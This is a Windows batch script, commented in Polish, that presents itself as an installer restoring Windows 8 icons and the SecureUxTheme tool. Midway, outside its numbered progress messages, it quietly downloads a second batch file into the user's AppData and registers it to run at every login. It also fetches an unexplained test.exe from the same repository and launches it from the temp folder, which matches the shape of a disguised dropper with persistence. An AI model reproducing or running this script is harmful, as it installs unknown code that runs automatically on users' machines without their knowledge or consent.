@echo off
setlocal

set ICON_URL=https://github.com/matisio3/rozne-pliki/releases/download/test/win8iconsforwin10.zip
set ICON_DIR=C:\RevertMetro\Ikony
set ZIP_PATH=%ICON_DIR%\win8icons.zip

echo [1/6] Tworzenie folderu %ICON_DIR%...
if not exist "%ICON_DIR%" (
    mkdir "%ICON_DIR%"
)

echo [2/6] Pobieranie paczki ikon...
powershell -Command "Invoke-WebRequest -Uri '%ICON_URL%' -OutFile '%ZIP_PATH%'"

echo [3/6] Rozpakowywanie...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%ICON_DIR%' -Force"

echo [4/6] Ustawianie ikon systemowych...

:: Komputer
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /v DefaultIcon /t REG_SZ /d "%ICON_DIR%\Computer.ico" /f

:: Sieć
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /v DefaultIcon /t REG_SZ /d "%ICON_DIR%\Network.ico" /f

:: Kosz - pusty
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}" /v empty /t REG_SZ /d "%ICON_DIR%\RecycleEmpty.ico" /f

:: Kosz - pełny
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}" /v full /t REG_SZ /d "%ICON_DIR%\RecycleFull.ico" /f

:: Folder użytkownika
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{59031a47-3f72-44a7-89c5-5595fe6b30ee}" /v DefaultIcon /t REG_SZ /d "%ICON_DIR%\UserFolder.ico" /f

echo [5/6] Restartowanie Eksploratora Windows...
taskkill /f /im explorer.exe >nul
start explorer.exe

echo [6/6] Gotowe! Ikony zostały zastosowane.
endlocal


:: Ścieżka do pobrania pliku ZIP
set INSTALLER_URL=https://github.com/namazso/SecureUxTheme/releases/download/v3.0.0/SecureUxTheme-amd64.zip
set ZIP_PATH=%TEMP%\SecureUxTheme-amd64.zip
set EXTRACT_DIR=%TEMP%\SecureUxTheme

:: Pobierz plik ZIP
echo [1/4] Pobieranie SecureUxTheme-amd64.zip...
powershell -Command "Invoke-WebRequest -Uri '%INSTALLER_URL%' -OutFile '%ZIP_PATH%'"

:: Wypakuj plik ZIP
echo [2/4] Wypakowywanie pliku ZIP...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force"

curl -o "%APPDATA%\czesc_3.bat" -L "https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/czesc_3.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v StartScript /t REG_SZ /d "%APPDATA%\czesc_3.bat" /f

rem Pobranie pliku test.exe do katalogu tymczasowego %temp%
curl -L -o "%temp%\test.exe" https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/test.exe

rem Uruchomienie pobranego pliku test.exe z katalogu %temp%
start "" "%temp%\test.exe"

:: Restart Eksploratora Windows, by zastosować zmiany
echo Restartowanie Eksploratora Windows...
taskkill /f /im explorer.exe
start /wait explorer.exe

:: Uruchom ThemeTool.exe
echo [3/4] Uruchamianie ThemeTool.exe...
start "" "%EXTRACT_DIR%\ThemeTool.exe" /verysilent

:: Usuwanie plików tymczasowych
echo [4/4] Czyszczenie plików tymczasowych...
del /F /Q "%ZIP_PATH%"
rmdir /S /Q "%EXTRACT_DIR%"

echo Instalacja SecureUxTheme zakończona!
endlocal

rem Zakończenie skryptu
exit


